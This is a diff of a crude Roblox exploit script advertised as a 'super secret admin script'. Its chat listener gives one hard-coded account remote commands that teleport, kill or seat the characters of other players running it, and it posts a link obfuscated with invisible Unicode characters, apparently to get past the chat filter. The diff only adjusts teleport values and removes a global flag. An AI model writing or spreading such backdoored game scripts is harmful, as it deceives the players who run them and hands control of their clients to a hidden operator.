@@ -1,4 +1,3 @@
-if getgenv().sex == true then end
 --SUPER SECRET ADMIN SCRIPT 😳
 --smd bitch
 function GetPlayer(String)
@@ -36,7 +35,7 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    
    if cmd == ";void" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
       h = target.Character.HumanoidRootPart
-      h.CFrame = h.CFrame - Vector3.new(0,2000,0)
+      h.CFrame = h.CFrame - Vector3.new(0,1000,0)
       
    elseif cmd == ";cmds" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
    local textChatService = game:GetService("TextChatService")
@@ -47,8 +46,8 @@ Listening = TextChatService.MessageReceived:Connect(function(prompt)
    textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
    
    elseif cmd == ";ac" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
-   h = target.Character:WaitForChild("HumanoidRootPart")
-   h.RotVelocity = Vector3.new(9999,9999,9999)
+      h = target.Character.HumanoidRootPart
+      h.CFrame = h.CFrame - Vector3.new(0,4000,0)
    
    elseif cmd == ";reset" and speaker == "Real_revvybxnned1" and game.Players.LocalPlayer.Name ~= REV then
    target.Character.Humanoid.Health = 0
@@ -62,4 +61,3 @@ elseif cmd == ";sit" and speaker == "Real_revvybxnned1" and game.Players.LocalPl
 
 end)
 print("SUPER SECRET ADMIN SCRIPT 😳")
-getgenv().sex = true
